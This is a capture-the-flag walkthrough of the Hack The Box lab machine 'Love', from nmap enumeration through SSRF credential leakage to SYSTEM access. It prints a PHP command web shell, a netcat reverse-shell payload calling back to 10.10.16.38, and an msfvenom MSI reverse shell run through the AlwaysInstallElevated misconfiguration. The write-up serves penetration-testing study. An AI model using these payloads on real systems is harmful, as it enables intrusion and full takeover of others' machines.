# Love

IP=10.10.10.239

## Solution

Start with an nmap
```bash
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
| SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
| -----BEGIN CERTIFICATE-----
| MIIDozCCAosCFFhDHcnclWJmeuqOK/LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD
| VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ
| c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X
| DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow
| CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv
| cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi
| MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQDQlH1J/AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20
| PL/6QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0
| 0zJMKeyBOD0+1K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2/mHLgfoR7U
| vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs/ZNyX3r8
| LtDiQUavwn2s+Hta0mslI0waTmyOsNrE4wgcdcF9kLK/9ttM1ugTJSQAQWbYo5LD
| 2bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL
| BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv/Z73I/qys0A
| y7crcy9dRO7M80Dnvj0ReGxoWN/95ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE
| nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO+8nywbQdiffatKO35McSl7ukvIK+d7gz
| oool/rMp/fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C+lJcuOxt7MhOk0h
| zSPL/pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ
| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?       syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '10.10.16.38' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.16.38' is not allowed to connect to this MariaDB server
5000/tcp open  http         syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Host script results:
|_clock-skew: mean: 2h41m32s, deviation: 4h02m30s, median: 21m31s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17572/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46453/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58543/udp): CLEAN (Timeout)
|   Check 4 (port 21885/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-06T08:59:30-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-06T15:59:29
|_  start_date: N/A
```

We can spot several things just by examining the nmap result:
- Might have smb shares with some creds
- No HTTPONLY flag in session cookies (allows cookie theft via XSS)
- Two hosts -> love.htb && staging.love.htb
- potential user -> roy@love.htb

After adding the hosts to **/etc/hosts** we can see that they provide different stuff
- love.htb -> just login form (does not enable user enumeration via error messages)
- staging.love.htb -> Free file scanner


Since i did not have creds for the **love.htb** i started from the other. It asks for a file at a given URL, it allows to perform RFI because it does not restrict address to **127.0.0.1** 

If we use something like **http://127.0.0.1/index.php" we can see that it renders the index page from the love.htb address 

After this, i did not had much, so i went ahead and fuzzed both hosts and found a **/admin** in the **love.htb**. This page leaks users because it gives a different message when trying to login as admin (which is an user that i found just by trying usernames)

Again, i did not had much, and started poking at other stuff:
- No smb shares
- Port 5000 requires creds

Well, what if we use the port 5000 index in the Free file scanner? Yup, it will give what we need, CREDS :D ```admin:@LoveIsInTheAir!!!!```

using those for the **love.htb/admin** we are provided with a dashboard that does not allow us to do much, but it allows to upload a profile picture!!! hummmmm 

At this point i figured that the **/images** i found during fuzzing serves a purpose, until this time it was just a normal thing!

We can actually upload **.php** files which we can include and execute via the free file scanner functionality. For this, i uploaded a simple backdoor to execute commands
```php
<?php system($_REQUEST['cmd']) ?>
```

Trying a reverse shell directly just proved to be kinda hard due to the encoding it uses so i uploaded a **netcat executable** and did not even used burp since it was not working at all

At the webpage form field i used ```http://127.0.0.1/images/www.php?cmd=.\waza.exe+-e+cmd.exe+10.10.16.38+8089``` to obtain the reverse shell !
```bash
cmd: whoami
love\phoebe

# lets get the user flag
cmd: type C:\Users\Phoebe\Desktop\user.txt
```

I will not post the actual flag hash to avoid a new ban ahah, suck my rick htb! ahahahah

Since i know very little about windows, i went to manual enumerate the system to gain a bit more knowledge.

I found that two registry keys are set (**AlwaysInstallElevated**) which indicates that **every msi** executed will **run as system** so i just needed to generate a msi file to give me a reverse shell.
```bash
# If these 2 registry keys are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY*SYSTEM*.
 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # 0x1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # 0x1
```


For that i used **msfvenom** which i rarely/never use
```bash
# generate the file
cmd (local): msfvenom --platform windows --arch x86 --payload windows/shell_reverse_tcp LHOST=10.10.16.38 LPORT=1414 --encoder x86/xor --iterations 9 --format msi --out waza.msi

# upload it to the machine via the profile pictures functionality

# to execute
cmd (remote): msiexec /quiet /qn /i waza.msi

cmd (shell): whoami 
nt authority\system

# get the flag
cmd (shell): type C:\Users\Administrator\Desktop\root.txt
```